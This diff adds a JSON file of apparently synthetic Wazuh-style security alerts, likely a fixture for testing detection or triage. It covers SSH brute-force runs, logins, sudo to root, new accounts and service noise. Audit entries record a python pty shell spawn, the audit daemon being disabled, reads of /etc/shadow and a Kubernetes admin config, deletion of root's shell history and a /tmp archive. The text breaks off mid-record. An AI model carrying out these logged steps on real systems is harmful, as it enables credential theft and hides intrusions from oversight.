@@ -1,0 +1,3310 @@
+[
+ {
+  "timestamp": "2026-11-10T01:00:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "45.33.32.156",
+   "dstuser": "alice"
+  }
+ },
+ {
+  "timestamp": "2026-11-10T01:01:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "45.33.32.156",
+   "dstuser": "alice"
+  }
+ },
+ {
+  "timestamp": "2026-11-10T01:02:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "45.33.32.156",
+   "dstuser": "alice"
+  }
+ },
+ {
+  "timestamp": "2026-11-10T01:03:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "45.33.32.156",
+   "dstuser": "alice"
+  }
+ },
+ {
+  "timestamp": "2026-11-10T01:04:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "45.33.32.156",
+   "dstuser": "alice"
+  }
+ },
+ {
+  "timestamp": "2026-11-10T01:05:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "45.33.32.156",
+   "dstuser": "alice"
+  }
+ },
+ {
+  "timestamp": "2026-11-10T01:10:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5715",
+   "level": 3,
+   "description": "sshd: authentication success.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "45.33.32.156",
+   "dstuser": "alice"
+  }
+ },
+ {
+  "timestamp": "2026-11-10T01:15:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5402",
+   "level": 3,
+   "description": "Successful sudo to ROOT executed.",
+   "groups": [
+    "sudo"
+   ]
+  },
+  "data": {
+   "srcuser": "alice",
+   "dstuser": "root",
+   "command": "/usr/bin/id"
+  }
+ },
+ {
+  "timestamp": "2026-11-10T03:00:00.000+0000",
+  "agent": {
+   "name": "app-04"
+  },
+  "rule": {
+   "id": "200008",
+   "level": 5,
+   "description": "Service reported an error 4711.",
+   "groups": [
+    "syslog"
+   ]
+  },
+  "full_log": "svc[0]: error 4711"
+ },
+ {
+  "timestamp": "2026-11-10T03:01:00.000+0000",
+  "agent": {
+   "name": "app-04"
+  },
+  "rule": {
+   "id": "200008",
+   "level": 5,
+   "description": "Service reported an error 4711.",
+   "groups": [
+    "syslog"
+   ]
+  },
+  "full_log": "svc[1]: error 4711"
+ },
+ {
+  "timestamp": "2026-11-10T05:00:00.000+0000",
+  "agent": {
+   "name": "web-02"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.9.1.1",
+   "dstuser": "erin"
+  }
+ },
+ {
+  "timestamp": "2026-11-10T05:01:00.000+0000",
+  "agent": {
+   "name": "web-02"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.9.1.1",
+   "dstuser": "erin"
+  }
+ },
+ {
+  "timestamp": "2026-11-10T05:02:00.000+0000",
+  "agent": {
+   "name": "web-02"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.9.1.1",
+   "dstuser": "erin"
+  }
+ },
+ {
+  "timestamp": "2026-11-10T05:05:00.000+0000",
+  "agent": {
+   "name": "web-02"
+  },
+  "rule": {
+   "id": "5715",
+   "level": 3,
+   "description": "sshd: authentication success.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.9.1.1",
+   "dstuser": "erin"
+  }
+ },
+ {
+  "timestamp": "2026-11-10T14:00:00.000+0000",
+  "agent": {
+   "name": "db-01"
+  },
+  "rule": {
+   "id": "5715",
+   "level": 3,
+   "description": "sshd: authentication success.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.9.9.9",
+   "dstuser": "bob"
+  }
+ },
+ {
+  "timestamp": "2026-11-10T14:20:00.000+0000",
+  "agent": {
+   "name": "db-01"
+  },
+  "rule": {
+   "id": "5402",
+   "level": 3,
+   "description": "Successful sudo to ROOT executed.",
+   "groups": [
+    "sudo"
+   ]
+  },
+  "data": {
+   "srcuser": "bob",
+   "dstuser": "root",
+   "command": "/usr/bin/id"
+  }
+ },
+ {
+  "timestamp": "2026-11-11T02:00:00.000+0000",
+  "agent": {
+   "name": "db-01"
+  },
+  "rule": {
+   "id": "5715",
+   "level": 3,
+   "description": "sshd: authentication success.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.9.9.8",
+   "dstuser": "bob"
+  }
+ },
+ {
+  "timestamp": "2026-11-11T03:00:00.000+0000",
+  "agent": {
+   "name": "db-02"
+  },
+  "rule": {
+   "id": "100904",
+   "level": 3,
+   "description": "sshd: authentication success.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.7.0.5",
+   "dstuser": "root"
+  }
+ },
+ {
+  "timestamp": "2026-11-11T03:00:00.000+0000",
+  "agent": {
+   "name": "app-04"
+  },
+  "rule": {
+   "id": "200008",
+   "level": 5,
+   "description": "Service reported an error 4711.",
+   "groups": [
+    "syslog"
+   ]
+  },
+  "full_log": "svc[0]: error 4711"
+ },
+ {
+  "timestamp": "2026-11-11T04:00:00.000+0000",
+  "agent": {
+   "name": "db-03"
+  },
+  "rule": {
+   "id": "100900",
+   "level": 3,
+   "description": "sshd: authentication success.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.9.2.2",
+   "dstuser": "frank"
+  }
+ },
+ {
+  "timestamp": "2026-11-12T01:00:00.000+0000",
+  "agent": {
+   "name": "app-01"
+  },
+  "rule": {
+   "id": "5715",
+   "level": 3,
+   "description": "sshd: authentication success.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.7.1.5",
+   "dstuser": "carol"
+  }
+ },
+ {
+  "timestamp": "2026-11-12T01:30:00.000+0000",
+  "agent": {
+   "name": "app-01"
+  },
+  "rule": {
+   "id": "5402",
+   "level": 3,
+   "description": "Successful sudo to ROOT executed.",
+   "groups": [
+    "sudo"
+   ]
+  },
+  "data": {
+   "srcuser": "carol",
+   "dstuser": "root",
+   "command": "/usr/bin/id"
+  }
+ },
+ {
+  "timestamp": "2026-11-12T02:00:00.000+0000",
+  "agent": {
+   "name": "app-01"
+  },
+  "rule": {
+   "id": "200001",
+   "level": 10,
+   "description": "New user added to the system.",
+   "groups": []
+  },
+  "full_log": "useradd: new user: name=svc1, UID=1001"
+ },
+ {
+  "timestamp": "2026-11-12T02:30:00.000+0000",
+  "agent": {
+   "name": "app-01"
+  },
+  "rule": {
+   "id": "200002",
+   "level": 12,
+   "description": "Suspicious interpreter started.",
+   "groups": []
+  },
+  "data": {
+   "audit": {
+    "exe": "/usr/bin/python3",
+    "auid": "4294967295",
+    "execve": {
+     "a0": "python3",
+     "a1": "-c",
+     "a2": "import pty",
+     "a10": "last"
+    }
+   }
+  }
+ },
+ {
+  "timestamp": "2026-11-12T03:00:00.000+0000",
+  "agent": {
+   "name": "app-04"
+  },
+  "rule": {
+   "id": "200008",
+   "level": 5,
+   "description": "Service reported an error 4711.",
+   "groups": [
+    "syslog"
+   ]
+  },
+  "full_log": "svc[0]: error 4711"
+ },
+ {
+  "timestamp": "2026-11-12T03:01:00.000+0000",
+  "agent": {
+   "name": "app-04"
+  },
+  "rule": {
+   "id": "200008",
+   "level": 5,
+   "description": "Service reported an error 4711.",
+   "groups": [
+    "syslog"
+   ]
+  },
+  "full_log": "svc[1]: error 4711"
+ },
+ {
+  "timestamp": "2026-11-12T03:02:00.000+0000",
+  "agent": {
+   "name": "app-04"
+  },
+  "rule": {
+   "id": "200008",
+   "level": 5,
+   "description": "Service reported an error 4711.",
+   "groups": [
+    "syslog"
+   ]
+  },
+  "full_log": "svc[2]: error 4711"
+ },
+ {
+  "timestamp": "2026-11-12T03:03:00.000+0000",
+  "agent": {
+   "name": "app-04"
+  },
+  "rule": {
+   "id": "200008",
+   "level": 5,
+   "description": "Service reported an error 4711.",
+   "groups": [
+    "syslog"
+   ]
+  },
+  "full_log": "svc[3]: error 4711"
+ },
+ {
+  "timestamp": "2026-11-12T03:04:00.000+0000",
+  "agent": {
+   "name": "app-04"
+  },
+  "rule": {
+   "id": "200008",
+   "level": 5,
+   "description": "Service reported an error 4711.",
+   "groups": [
+    "syslog"
+   ]
+  },
+  "full_log": "svc[4]: error 4711"
+ },
+ {
+  "timestamp": "2026-11-12T03:05:00.000+0000",
+  "agent": {
+   "name": "app-04"
+  },
+  "rule": {
+   "id": "200008",
+   "level": 5,
+   "description": "Service reported an error 4711.",
+   "groups": [
+    "syslog"
+   ]
+  },
+  "full_log": "svc[5]: error 4711"
+ },
+ {
+  "timestamp": "2026-11-12T03:06:00.000+0000",
+  "agent": {
+   "name": "app-04"
+  },
+  "rule": {
+   "id": "200008",
+   "level": 5,
+   "description": "Service reported an error 4711.",
+   "groups": [
+    "syslog"
+   ]
+  },
+  "full_log": "svc[6]: error 4711"
+ },
+ {
+  "timestamp": "2026-11-12T03:07:00.000+0000",
+  "agent": {
+   "name": "app-04"
+  },
+  "rule": {
+   "id": "200008",
+   "level": 5,
+   "description": "Service reported an error 4711.",
+   "groups": [
+    "syslog"
+   ]
+  },
+  "full_log": "svc[7]: error 4711"
+ },
+ {
+  "timestamp": "2026-11-12T03:08:00.000+0000",
+  "agent": {
+   "name": "app-04"
+  },
+  "rule": {
+   "id": "200008",
+   "level": 5,
+   "description": "Service reported an error 4711.",
+   "groups": [
+    "syslog"
+   ]
+  },
+  "full_log": "svc[8]: error 4711"
+ },
+ {
+  "timestamp": "2026-11-12T03:09:00.000+0000",
+  "agent": {
+   "name": "app-04"
+  },
+  "rule": {
+   "id": "200008",
+   "level": 5,
+   "description": "Service reported an error 4711.",
+   "groups": [
+    "syslog"
+   ]
+  },
+  "full_log": "svc[9]: error 4711"
+ },
+ {
+  "timestamp": "2026-11-12T03:10:00.000+0000",
+  "agent": {
+   "name": "app-04"
+  },
+  "rule": {
+   "id": "200008",
+   "level": 5,
+   "description": "Service reported an error 4711.",
+   "groups": [
+    "syslog"
+   ]
+  },
+  "full_log": "svc[10]: error 4711"
+ },
+ {
+  "timestamp": "2026-11-12T03:11:00.000+0000",
+  "agent": {
+   "name": "app-04"
+  },
+  "rule": {
+   "id": "200008",
+   "level": 5,
+   "description": "Service reported an error 4711.",
+   "groups": [
+    "syslog"
+   ]
+  },
+  "full_log": "svc[11]: error 4711"
+ },
+ {
+  "timestamp": "2026-11-12T03:12:00.000+0000",
+  "agent": {
+   "name": "app-04"
+  },
+  "rule": {
+   "id": "200008",
+   "level": 5,
+   "description": "Service reported an error 4711.",
+   "groups": [
+    "syslog"
+   ]
+  },
+  "full_log": "svc[12]: error 4711"
+ },
+ {
+  "timestamp": "2026-11-12T03:13:00.000+0000",
+  "agent": {
+   "name": "app-04"
+  },
+  "rule": {
+   "id": "200008",
+   "level": 5,
+   "description": "Service reported an error 4711.",
+   "groups": [
+    "syslog"
+   ]
+  },
+  "full_log": "svc[13]: error 4711"
+ },
+ {
+  "timestamp": "2026-11-12T03:14:00.000+0000",
+  "agent": {
+   "name": "app-04"
+  },
+  "rule": {
+   "id": "200008",
+   "level": 5,
+   "description": "Service reported an error 4711.",
+   "groups": [
+    "syslog"
+   ]
+  },
+  "full_log": "svc[14]: error 4711"
+ },
+ {
+  "timestamp": "2026-11-12T04:00:00.000+0000",
+  "agent": {
+   "name": "app-05"
+  },
+  "rule": {
+   "id": "200008",
+   "level": 5,
+   "description": "Service reported an error 4711.",
+   "groups": [
+    "syslog"
+   ]
+  },
+  "full_log": "kernel: sshd[1234]: segfault at 0 ip 00007f"
+ },
+ {
+  "timestamp": "2026-11-12T09:00:00.000+0000",
+  "agent": {
+   "name": "app-07"
+  },
+  "rule": {
+   "id": "200001",
+   "level": 10,
+   "description": "New user added to the system.",
+   "groups": []
+  },
+  "full_log": "useradd: new user: name=svc2"
+ },
+ {
+  "timestamp": "2026-11-13T01:00:00.000+0000",
+  "agent": {
+   "name": "app-02"
+  },
+  "rule": {
+   "id": "200003",
+   "level": 12,
+   "description": "Audit daemon stopped by an interactive user and left disabled.",
+   "groups": []
+  },
+  "data": {
+   "audit": {
+    "exe": "/usr/bin/systemctl",
+    "auid": "1001"
+   }
+  }
+ },
+ {
+  "timestamp": "2026-11-13T01:01:00.000+0000",
+  "agent": {
+   "name": "app-02"
+  },
+  "rule": {
+   "id": "200003",
+   "level": 12,
+   "description": "Audit daemon stopped by an interactive user and left disabled.",
+   "groups": []
+  },
+  "data": {
+   "audit": {
+    "exe": "/usr/bin/systemctl",
+    "auid": "1001"
+   }
+  }
+ },
+ {
+  "timestamp": "2026-11-13T01:10:00.000+0000",
+  "agent": {
+   "name": "app-02"
+  },
+  "rule": {
+   "id": "200005",
+   "level": 12,
+   "description": "Credential file read.",
+   "groups": []
+  },
+  "data": {
+   "audit": {
+    "file": {
+     "name": "/etc/shadow"
+    },
+    "auid": "1001"
+   }
+  }
+ },
+ {
+  "timestamp": "2026-11-13T01:12:00.000+0000",
+  "agent": {
+   "name": "app-03"
+  },
+  "rule": {
+   "id": "200005",
+   "level": 12,
+   "description": "Credential file read.",
+   "groups": []
+  },
+  "data": {
+   "audit": {
+    "file": {
+     "name": "/etc/kubernetes/admin.conf"
+    },
+    "auid": "1003"
+   }
+  }
+ },
+ {
+  "timestamp": "2026-11-13T01:20:00.000+0000",
+  "agent": {
+   "name": "app-02"
+  },
+  "rule": {
+   "id": "200004",
+   "level": 10,
+   "description": "Shell history removed.",
+   "groups": []
+  },
+  "data": {
+   "audit": {
+    "exe": "/usr/bin/rm",
+    "auid": "1001",
+    "execve": {
+     "a0": "rm",
+     "a1": "/root/.bash_history"
+    }
+   }
+  }
+ },
+ {
+  "timestamp": "2026-11-13T01:40:00.000+0000",
+  "agent": {
+   "name": "app-03"
+  },
+  "rule": {
+   "id": "100815",
+   "level": 10,
+   "description": "Archive created from a sensitive path.",
+   "groups": []
+  },
+  "data": {
+   "audit": {
+    "exe": "/usr/bin/tar",
+    "auid": "1003",
+    "execve": {
+     "a0": "tar",
+     "a1": "czf",
+     "a2": "/tmp/x.tgz"
+    }
+   }
+  }
+ },
+ {
+  "timestamp": "2026-11-13T09:00:00.000+0000",
+  "agent": {
+   "name": "app-08"
+  },
+  "rule": {
+   "id": "200003",
+   "level": 12,
+   "description": "Audit daemon stopped by an interactive user and left disabled.",
+   "groups": []
+  },
+  "data": {
+   "audit": {
+    "exe": "/usr/bin/systemctl",
+    "auid": "1002"
+   }
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:00:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.1",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:00:01.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.1",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:00:02.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.1",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:00:03.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.1",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:00:04.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.1",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:01:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.2",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:01:01.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.2",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:01:02.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.2",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:01:03.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.2",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:01:04.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.2",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:02:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.3",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:02:01.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.3",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:02:02.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.3",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:02:03.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.3",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:02:04.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.3",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:03:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.4",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:03:01.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.4",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:03:02.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.4",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:03:03.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.4",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:03:04.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.4",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:04:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.5",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:04:01.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.5",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:04:02.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.5",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:04:03.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.5",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:04:04.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.5",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:05:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.6",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:05:01.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.6",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:05:02.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.6",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:05:03.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.6",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:05:04.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.6",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:06:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.7",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:06:01.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.7",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:06:02.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.7",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:06:03.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.7",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:06:04.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.7",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:07:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.8",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:07:01.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.8",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:07:02.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.8",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:07:03.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.8",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:07:04.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.8",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:08:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.9",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:08:01.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
